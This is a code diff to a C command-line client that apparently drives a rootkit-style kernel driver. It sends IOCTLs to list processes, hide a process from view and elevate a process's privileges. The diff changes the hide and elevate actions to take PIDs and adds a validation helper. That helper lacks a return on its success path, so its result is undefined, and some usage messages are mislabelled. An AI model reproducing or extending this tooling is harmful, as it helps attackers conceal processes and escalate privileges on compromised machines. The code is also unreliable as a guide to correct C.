@@ -56,6 +56,15 @@ void PrintUsage(const char* progName)
     printf("Usage: %s <category> <action> [options]\n\n", progName);
 }
 
+BOOL ConversionGuard(const CHAR* str) {
+	ULONG i = 0;
+	i = ParsePidFromString(str);
+    if (i == 0) {
+        printf("[!] Invalid PID: %s\n", str);
+		return FALSE;
+    }
+}
+
 int HandleDriverCommand(int argc, char* argv[], char* buffer)
 {   
    
@@ -133,42 +142,45 @@ int HandleProcessCommand(int argc, char* argv[], char* buffer)
         SendIOCTL(IOCTL_SPY_PLIST, NULL, 0, buffer, BUFFER_SIZE);
         return 0;
     }
-    // Action: --hide <process.exe>
+    // Action: --hide <pid>
     else if (strcmp(action, "--hide") == 0) {
         if (argc < 4) {
             printf("[!] Missing driver name\n");
-            printf("Usage: %s process --hide <process.exe>\n", argv[0]);
-            printf("Example: %s process --hide notepad.exe\n", argv[0]);
+            printf("Usage: %s process --hide <pid>\n", argv[0]);
+            printf("Example: %s process --hide 123\n", argv[0]);
             return 1;
         }
 
-        const char* processName = argv[3];
-        /*printf("[*] Hiding process: %s\n\n", processName);*/
+        const char* processPid = argv[3];
+        /*printf("[*] Hiding process: %s\n\n", processPid);*/
 
         // Prepare input structure
         SPY_HIDE_INPUT input = { 0 };
-        strncpy_s(input.g_Name, sizeof(input.g_Name), processName, _TRUNCATE);
-
+        strncpy_s(input.g_Name, sizeof(input.g_Name), processPid, _TRUNCATE);
+		// guard conversion
+		if (!ConversionGuard(processPid)) return 1;
         // Copy input to start of buffer, output will overwrite
         memcpy(buffer, &input, sizeof(input));
         SendIOCTL(IOCTL_SPY_PHIDE, buffer, sizeof(input), buffer, BUFFER_SIZE);
         return 0;
     }
 
-    // Action: --elevate <process.exe>
+    // Action: --elevate <pid>
     else if (strcmp(action, "--elevate") == 0) {
         if (argc < 4) {
             printf("[!] Missing process name\n");
-            printf("Usage: %s process --elevate <process.exe>\n", argv[0]);
-            printf("Example: %s process --elevate cmd.exe\n", argv[0]);
+            printf("Usage: %s process --elevate <pid>\n", argv[0]);
+            printf("Example: %s process --elevate 123\n", argv[0]);
             return 1;
         }
 
-        const char* processName = argv[3];
+        const char* processPid = argv[3];
 
         SPY_HIDE_INPUT input = { 0 };
-        strncpy_s(input.g_Name, sizeof(input.g_Name), processName, _TRUNCATE);
-
+        strncpy_s(input.g_Name, sizeof(input.g_Name), processPid, _TRUNCATE);
+        // guard conversion
+        if (!ConversionGuard(processPid)) return 1;
+		// Copy input to start of buffer, output will overwrite
         memcpy(buffer, &input, sizeof(input));
         SendIOCTL(IOCTL_SPY_UPDATE, buffer, sizeof(input), buffer, BUFFER_SIZE);
         return 0;
